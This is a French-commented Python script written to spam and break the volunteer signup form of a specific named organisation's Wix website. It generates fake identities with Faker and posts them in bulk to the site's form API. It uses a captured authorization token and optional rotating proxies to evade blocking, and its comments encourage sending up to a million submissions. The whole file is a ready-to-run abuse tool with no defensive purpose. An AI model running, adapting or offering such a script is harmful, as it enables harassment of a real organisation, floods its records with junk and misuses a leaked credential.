# collectif nemesis spammer by @euphoncaca pour casser leur form :D 


import requests
import json
from faker import Faker


faker = Faker()

# mettez 1000000 si vous voulez en send 10k osef
nombre_enregistrements = 5

# pour utiliser un proxy true = proxy qui rotate
utiliser_proxy = False
proxy = {'http': 'http://user:pass@proxy.example.com:8080',
         'https': 'https://user:pass@proxy.example.com:8080'} if utiliser_proxy else None

# possible que si ca marche plus de update l'auth ( maj github )
headers1 = {
    'Referer': 'https://www.collectif-nemesis.com/_partials/wix-thunderbolt/dist/clientWorker.8d461475.bundle.min.js',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Authorization': '-7eYL91cHcrbwQK_BcH3mcJtqpEvlLqYJeMGJnjZLDY.eyJpbnN0YW5jZUlkIjoiNDAyNmNkMDQtZDliNC00ZDk3LWFmZGMtY2FhOWUwNGNmMTU3IiwiYXBwRGVmSWQiOiIxNGNlMTIxNC1iMjc4LWE3ZTQtMTM3My0wMGNlYmQxYmVmN2MiLCJtZXRhU2l0ZUlkIjoiNGQxZjQ4MGQtMzJjYy00ZDkxLTg5MzgtNzcyMzdjMWIxOWQ5Iiwic2lnbkRhdGUiOiIyMDI0LTA0LTA5VDIwOjA2OjE0LjM2MFoiLCJkZW1vTW9kZSI6ZmFsc2UsIm9yaWdpbkluc3RhbmNlSWQiOiI2MzEwMmM3NS05NjhmLTQxZTktOTc5Ny03MzU0YWZmYTdlMzkiLCJhaWQiOiI0MDNkZWU5My05ZmFhLTRkZjYtYTU5MS0zZjg2NTIzYzk1MGYiLCJiaVRva2VuIjoiMGQzOTg1MDktZWI3OC0wMDA2LTI2ZTQtYmQ4YTljNTdlODhlIiwic2l0ZU93bmVySWQiOiI2NDVlODgzYy0zM2M2LTRjMDUtYmQwMi1lYmQ5MTFmYjY3ZWQifQ',
    'X-Wix-Client-Artifact-Id': 'wix-form-builder',
    'Content-Type': 'application/json',
}

# pas touche ou ca casse le code lololol
def generer_valeurs_aleatoires():
    random_first_name = faker.first_name()
    random_last_name = faker.last_name()
    random_age = faker.random_int(18, 80)
    random_email = faker.email()
    random_phone = faker.phone_number()
    random_telegram = faker.user_name()
    random_skills = faker.sentence()
    random_address = faker.street_address()
    random_city = faker.city()
    random_zip_code = faker.zipcode()
    return {
        "firstName": random_first_name,
        "lastName": str(random_age),
        "email": random_email,
        "phone": random_phone,
        "telegram": random_telegram,
        "skills": random_skills,
        "address": random_address,
        "city": random_city,
        "zip_code": random_zip_code
    }

for _ in range(nombre_enregistrements):
    
    valeurs_aleatoires = generer_valeurs_aleatoires()
    
    
    data1 = {
      "formProperties": {
        "formName": "Devenir sympathisant 2",
        "formId": "comp-lo5nngoz"
      },
      "emailConfig": {
        "sendToOwnerAndEmails": {
          "emailIds": []
        }
      },
      "viewMode": "Site",
      "fields": [
        {"fieldId": "comp-lo5nngp2", "label": "Nom et prénom", "firstName": {"value": valeurs_aleatoires["firstName"]}},
        {"fieldId": "comp-lo5nngp6", "label": "Age", "lastName": {"value": valeurs_aleatoires["lastName"]}},
        {"fieldId": "comp-lo5nngpd1", "label": "Email", "email": {"value": valeurs_aleatoires["email"], "tag": "main"}},
        {"fieldId": "comp-lo5nngpv", "label": "RS (instagram, facebook, twitter ...)", "additional": {"value": {"string": "ffx"}}},
        {"fieldId": "comp-lo5nngpx2", "label": "Téléphone", "phone": {"value": valeurs_aleatoires["phone"], "tag": "other"}},
        {"fieldId": "comp-lo5nngq02", "label": "Identifiant Télégram si vous souhaitez être ajouté à notre groupe", "phone": {"value": valeurs_aleatoires["telegram"], "tag": "other"}},
        {"fieldId": "comp-lo5nngq31", "label": "Avez-vous des compétences qui pourraient être utiles à notre associaton ?", "additional": {"value": {"string": valeurs_aleatoires["skills"]}}},
        {"fieldId": "comp-lo5nngq55", "label": "TextAreaInput", "additional": {"value": {"string": valeurs_aleatoires["skills"]}}},
        {"fieldId": "comp-lo5nngqc1", "label": "J’accepte les termes et conditions", "additional": {"value": {"checkbox": True}}},
        {"fieldId": "comp-lo5nngpl", "label": "Adresse postale", "streetAddress": {"value": valeurs_aleatoires["address"], "key": "comp-lo5nngpi"}},
        {"fieldId": "comp-lo5nngpo1", "label": "Ville 2", "city": {"value": valeurs_aleatoires["city"], "key": "comp-lo5nngpi"}},
        {"fieldId": "comp-lo5nngps1", "label": "Code postal", "zipCode": {"value": valeurs_aleatoires["zip_code"], "key": "comp-lo5nngpi"}}
      ],
      "labelKeys": ["contacts.contacted-me", "custom.devenir-sympathisant-2"]
    }
    
    
    response1 = requests.post('https://www.collectif-nemesis.com/_api/wix-forms/v1/submit-form', headers=headers1, data=json.dumps(data1), proxies=proxy)
    
    
    print("formulaire envoyé - {}: {}".format(_ + 1, response1.text))
